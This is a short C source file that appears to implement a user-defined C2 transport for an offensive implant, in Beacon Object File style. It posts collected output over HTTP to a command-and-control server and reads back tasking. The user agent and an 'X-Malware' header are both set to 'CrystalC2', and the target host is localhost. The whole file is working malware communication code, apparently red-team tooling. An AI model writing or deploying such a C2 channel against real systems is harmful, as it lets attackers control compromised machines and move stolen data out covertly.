#include <windows.h>
#include "http.h"

DECLSPEC_IMPORT errno_t WINAPIV MSVCRT$strcpy_s ( char *, rsize_t, const char * );
DECLSPEC_IMPORT void    WINAPIV MSVCRT$free     ( void * );

#define memcpy(x, y, z) __movsb ( ( UCHAR * ) x, ( UCHAR * ) y, z );

HttpHandle * g_client;

void udc2_init ( )
{
    g_client = HttpInit ( 0 );
    g_client->response_timeout_ms = 5000;
    
    MSVCRT$strcpy_s ( g_client->user_agent, sizeof ( g_client->user_agent ), "CrystalC2/1.0" );
}

int udc2_go ( const char * out_data, const size_t out_data_len, char * in_data, size_t * in_data_len )
{
    HttpHeader headers_array [ 2 ];

    headers_array [ 0 ].name  = "Content-Type";
	headers_array [ 0 ].value = "application/octet-stream";
    headers_array [ 1 ].name  = "X-Malware";
	headers_array [ 1 ].value = "CrystalC2";

    HttpHeaders headers   = { headers_array, 2 };
    HttpURI uri           = { "localhost", 80, "/" };
    HttpBody body         = { ( const BYTE * ) out_data, out_data_len };
    HttpResponse response = { 0 };
    BOOL success          = HttpRequest ( g_client, HTTP_METHOD_POST, &uri, &headers, &body, &response );

    if ( success && in_data != NULL && in_data_len != NULL )
    {
        size_t len_to_copy = response.body_size;

        if ( len_to_copy > * in_data_len ) {
            len_to_copy = * in_data_len;
        }

        memcpy ( in_data, response.body, len_to_copy );
        * in_data_len = len_to_copy;
    }

    MSVCRT$free ( response.content_type );
    MSVCRT$free ( response.body );

    return success;
}

void udc2_free ( )
{
    if ( g_client )
        HttpDestroy ( g_client );
}